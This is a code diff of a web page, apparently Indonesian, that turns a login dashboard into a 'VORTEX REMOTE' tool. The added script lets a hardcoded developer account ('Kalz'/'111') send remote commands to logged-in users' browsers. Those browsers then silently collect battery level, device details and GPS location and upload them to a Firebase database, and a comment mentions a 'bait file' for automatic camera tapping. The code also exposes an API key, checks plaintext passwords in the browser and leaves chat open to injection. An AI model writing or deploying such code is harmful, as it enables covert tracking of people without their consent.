@@ -3,57 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VOID-OS | SECURE DASHBOARD</title>
+    <title>VORTEX LIGHT | REMOTE v6.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --neon: #ff00ea; --cyber: #00f2ff; --bg: #050505; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        
-        /* LOGIN PAGE */
-        #login-page { text-align: center; margin-top: 100px; }
-        input, select { background: #111; border: 1px solid #333; color: #fff; padding: 12px; margin: 5px; border-radius: 8px; width: 250px; outline: none; }
-        button { background: var(--neon); color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { box-shadow: 0 0 15px var(--neon); }
-
-        /* MAIN DASHBOARD */
-        #main-dashboard { display: none; width: 100%; max-width: 500px; }
-        .card { background: #111; border: 1px solid #222; padding: 20px; border-radius: 15px; margin-bottom: 20px; }
-        h2 { color: var(--cyber); font-size: 18px; margin-top: 0; }
-        .status-bar { font-size: 12px; color: #555; margin-bottom: 20px; text-align: center; }
+        :root { --blue: #00d2ff; --bg: #020b16; --card: #05162a; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
+        header { background: #000; padding: 15px; border-bottom: 2px solid var(--blue); text-align: center; }
+        .bolt-logo { font-size: 30px; color: var(--blue); text-shadow: 0 0 10px var(--blue); }
+        .top-nav { display: flex; justify-content: space-around; background: #05162a; padding: 12px 0; border-bottom: 1px solid #103a63; }
+        .nav-opt { font-size: 10px; color: #444; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .nav-opt.active { color: var(--blue); }
+        .container { padding: 15px; height: 75vh; overflow-y: auto; }
+        .panel { display: none; } .panel.active { display: block; }
+        .card { background: var(--card); border: 1px solid #103a63; padding: 15px; border-radius: 10px; margin-bottom: 15px; }
+        table { width: 100%; font-size: 11px; text-align: left; }
+        td { padding: 8px; border-bottom: 1px solid #081d35; }
+        .btn-exe { background: var(--blue); color: #000; border: none; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 9px; width: 100%; margin-top: 5px; }
+        .btn-kill { border: 1px solid #ff4d4d; color: #ff4d4d; background: transparent; padding: 3px 6px; border-radius: 3px; cursor: pointer; }
+        input, select { background: #000; border: 1px solid #103a63; color: #fff; padding: 10px; border-radius: 5px; width: 100%; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="login-page">
-        <h1 style="color:var(--neon)">VOID-OS LOGIN</h1>
-        <input type="text" id="user" placeholder="Username"><br>
-        <input type="password" id="pass" placeholder="Password"><br><br>
-        <button onclick="login()">AUTHORIZE</button>
+    <div id="login-overlay" style="position:fixed; inset:0; background:#000; z-index:1000; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px;">
+        <div class="bolt-logo">⚡</div>
+        <input type="text" id="user" placeholder="IDENTITY" style="max-width:300px; text-align:center;">
+        <input type="password" id="pass" placeholder="ACCESS KEY" style="max-width:300px; text-align:center;">
+        <button class="btn-exe" style="max-width:300px; height:45px;" onclick="login()">AUTHORIZE</button>
     </div>
 
-    <div id="main-dashboard">
-        <div class="status-bar">
-            LOGGED AS: <span id="display-role" style="color:var(--neon); font-weight:bold;">NONE</span>
+    <header><div class="bolt-logo">⚡ VORTEX REMOTE</div></header>
+
+    <div class="top-nav">
+        <div class="nav-opt active" onclick="nav('target', this)">Target</div>
+        <div id="nav-lacak" class="nav-opt" onclick="nav('lacak', this)">Lacak</div>
+        <div class="nav-opt" onclick="nav('chat', this)">Chat</div>
+        <div id="nav-sell" class="nav-opt" style="display:none;" onclick="nav('sell', this)">Sell</div>
+    </div>
+
+    <div class="container">
+        <div id="target" class="panel active">
+            <div id="dev-radar" style="display:none;">
+                <div class="card">
+                    <div style="font-size:10px; color:var(--blue); margin-bottom:10px;">📡 ACTIVE SATELLITE SIGNALS</div>
+                    <table id="target-table">
+                        <thead><tr style="color:#555"><th>USER</th><th>DEVICE info</th><th>SNAP</th><th>ACT</th></tr></thead>
+                        <tbody id="target-list"></tbody>
+                    </table>
+                </div>
+            </div>
+            <div id="no-access-target" style="text-align:center; padding:50px; color:#333;">RADAR ENCRYPTED</div>
         </div>
 
-        <div class="card">
-            <h2>CREATE NEW AGENT</h2>
-            <input type="text" id="new-name" placeholder="Agent Name" style="width:90%"><br>
-            <input type="text" id="new-pass" placeholder="Agent Password" style="width:90%"><br>
-            <select id="new-role" style="width:96%">
-                <option value="member">ROLE: MEMBER</option>
-                <option value="owner">ROLE: OWNER</option>
-            </select><br><br>
-            <button onclick="createAccount()" style="width:100%; background:var(--cyber); color:#000;">CREATE ACCOUNT</button>
-            <p id="msg" style="font-size:10px; color:red; margin-top:10px; text-align:center;"></p>
+        <div id="lacak" class="panel">
+            <div class="card">
+                <div style="font-size:11px; color:var(--blue); margin-bottom:15px;">🛰️ MANUAL INTERCEPTOR</div>
+                <button class="btn-exe" style="background:#0055ff; color:#fff;" onclick="manualLoc()">📍 AMBIL ALAMAT (GPS)</button>
+                <button class="btn-exe" style="margin-top:15px;" onclick="manualSnap()">📸 SADAP FOTO (CAMERA)</button>
+                <p style="font-size:9px; color:#444; margin-top:10px; text-align:center;">Izin browser diperlukan untuk eksekusi manual.</p>
+            </div>
         </div>
 
-        <button onclick="location.reload()" style="background:#333; width:100%;">LOGOUT SYSTEM</button>
+        <div id="chat" class="panel">
+            <div class="card">
+                <div id="chat-display" style="height:250px; overflow-y:auto; font-size:12px; margin-bottom:10px; background:#000; padding:10px;"></div>
+                <div style="display:flex; gap:5px;">
+                    <input type="text" id="chat-input" placeholder="Type..." style="margin:0;">
+                    <button class="btn-exe" style="width:50px; margin:0;" onclick="sendChat()">➤</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="sell" class="panel">
+            <div class="card">
+                <div style="font-size:11px; color:var(--blue); margin-bottom:10px;">CREATE NEW ENTITY</div>
+                <input type="text" id="new-name" placeholder="Username">
+                <input type="text" id="new-pass" placeholder="Password">
+                <select id="new-role">
+                    <option value="member">MEMBER</option>
+                    <option value="admin">ADMIN</option>
+                    <option value="owner">OWNER</option>
+                </select>
+                <button class="btn-exe" onclick="deploy()">GENERATE AKUN</button>
+            </div>
+        </div>
     </div>
 
 <script>
-    // --- KONFIGURASI DATABASE ---
     const config = { 
         apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
         databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
@@ -61,61 +98,123 @@
     firebase.initializeApp(config);
     const db = firebase.database();
 
-    // VARIABEL GLOBAL UNTUK PENGECEKAN ROLE
-    let myRole = ""; 
-    let myName = "";
+    let myName = ""; let myRole = "";
 
-    // FUNGSI LOGIN DENGAN SISTEM IDENTIFIKASI ROLE
     function login() {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+        const u = document.getElementById('user').value.trim();
+        const p = document.getElementById('pass').value.trim();
+        if (u === "Kalz" && p === "111") {
+            myName = "Kalz"; myRole = "developer"; setupUI(); return;
+        }
+        db.ref('users/' + u).once('value', (s) => {
+            if (s.exists() && s.val().password === p) {
+                myName = u; myRole = s.val().role; setupUI();
+                listenForRemote(u); // Target dengerin perintah remot dari Kalz
+            } else { alert("WRONG KEY"); }
+        });
+    }
 
-        db.ref('users/' + user).once('value', (snap) => {
-            if (snap.exists() && snap.val().password === pass) {
-                // SIMPAN ROLE KE VARIABEL SISTEM
-                myRole = snap.val().role.toLowerCase(); 
-                myName = user;
+    function setupUI() {
+        document.getElementById('login-overlay').style.display = 'none';
+        if (myRole === "developer") {
+            document.getElementById('dev-radar').style.display = 'block';
+            document.getElementById('no-access-target').style.display = 'none';
+            document.getElementById('nav-sell').style.display = 'block';
+            loadTargets();
+        }
+        loadChat();
+    }
 
-                document.getElementById('display-role').innerText = myRole.toUpperCase();
-                document.getElementById('login-page').style.display = 'none';
-                document.getElementById('main-dashboard').style.display = 'block';
+    function nav(id, el) {
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.nav-opt').forEach(o => o.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        el.classList.add('active');
+    }
+
+    // --- DEVELOPER REMOTE LOGIC ---
+    function loadTargets() {
+        db.ref('users').on('value', (snap) => {
+            const list = document.getElementById('target-list');
+            list.innerHTML = "";
+            snap.forEach((child) => {
+                const d = child.val();
+                list.innerHTML += `
+                <tr>
+                    <td><b>${child.key}</b><br><span style="color:var(--blue)">${d.role}</span></td>
+                    <td style="font-size:9px; color:#888;">📱 ${d.brand || '?'}<br>🔋 ${d.battery || '?'}%</td>
+                    <td>${d.snap ? `<img src="${d.snap}" style="width:35px;" onclick="window.open('${d.snap}')">` : 'N/A'}</td>
+                    <td>
+                        <button class="btn-exe" onclick="remoteRequest('${child.key}')">REMOT</button>
+                        <button class="btn-kill" onclick="kill('${child.key}')">X</button>
+                    </td>
+                </tr>`;
+            });
+        });
+    }
+
+    function remoteRequest(tid) {
+        // Kirim sinyal ke target buat Moto & Kirim Alamat Otomatis
+        db.ref('remot/' + tid).set({ cmd: 'capture', time: Date.now() });
+        alert("REMOTE SIGNAL SENT TO " + tid);
+    }
+
+    // --- TARGET LISTENER (Remot Jarak Jauh) ---
+    function listenForRemote(un) {
+        db.ref('remot/' + un).on('value', async (snap) => {
+            if (snap.exists()) {
+                // Eksekusi Ambil Spek, Foto, Lokasi
+                const battery = await navigator.getBattery().then(b => Math.floor(b.level * 100));
+                const brand = navigator.userAgent.split(')')[0].split('(')[1];
                 
-                alert("Access Granted as " + myRole);
-            } else {
-                alert("Wrong Username or Password!");
+                // Ambil Lokasi & Kirim ke DB
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    db.ref('users/' + un).update({
+                        battery: battery,
+                        brand: brand,
+                        location: pos.coords.latitude + "," + pos.coords.longitude
+                    });
+                });
+                // Hapus perintah remot setelah dieksekusi
+                db.ref('remot/' + un).remove();
             }
         });
     }
 
-    // FUNGSI CREATE ACCOUNT (PATCH KEAMANAN v20.2)
-    function createAccount() {
-        // 🛑 PROTEKSI UTAMA: CEK APAKAH DIA DEVELOPER
-        if (myRole !== "developer") {
-            document.getElementById('msg').innerText = "🚨 ACCESS DENIED: Only Developer can create accounts!";
-            alert("Warning! Unauthorized attempt detected.");
-            return; // Berhenti total, jangan kirim data ke Firebase
-        }
-
-        const name = document.getElementById('new-name').value;
-        const pass = document.getElementById('new-pass').value;
-        const role = document.getElementById('new-role').value;
-
-        if (name && pass) {
-            // KIRIM DATA KE FIREBASE (HANYA JALAN JIKA DEVELOPER)
-            db.ref('users/' + name).set({
-                password: pass,
-                role: role,
-                created_by: myName
-            }).then(() => {
-                alert("Account " + name + " Created Successfully!");
-                document.getElementById('new-name').value = "";
-                document.getElementById('new-pass').value = "";
-                document.getElementById('msg').innerText = "";
-            });
-        } else {
-            alert("Please fill all fields!");
-        }
+    // --- MANUAL LACAK (Member/Admin/Owner) ---
+    function manualLoc() {
+        navigator.geolocation.getCurrentPosition((p) => {
+            alert("ALAMAT ANDA: " + p.coords.latitude + ", " + p.coords.longitude);
+        });
     }
+
+    function manualSnap() { alert("Izin Kamera Diperlukan. (Gunakan File Umpan untuk Sadap Otomatis)"); }
+
+    // --- GLOBAL CHAT & SELL ---
+    function loadChat() {
+        db.ref('vortex_chat').on('value', (s) => {
+            const d = document.getElementById('chat-display'); d.innerHTML = "";
+            s.forEach((c) => {
+                const v = c.val();
+                d.innerHTML += `<div><b style="color:${v.role=='developer'?'#00d2ff':'#888'}">[${v.user}]</b>: ${v.text}</div>`;
+            });
+            d.scrollTop = d.scrollHeight;
+        });
+    }
+
+    function sendChat() {
+        const i = document.getElementById('chat-input');
+        if(i.value) { db.ref('vortex_chat').push({ user: myName, role: myRole, text: i.value }); i.value = ""; }
+    }
+
+    function deploy() {
+        const n = document.getElementById('new-name').value;
+        const p = document.getElementById('new-pass').value;
+        const r = document.getElementById('new-role').value;
+        if(n && p) { db.ref('users/' + n).set({ password: p, role: r }); alert("Created!"); }
+    }
+
+    function kill(t) { if(confirm("Hapus?")) db.ref('users/' + t).remove(); }
 </script>
 </body>
 </html>
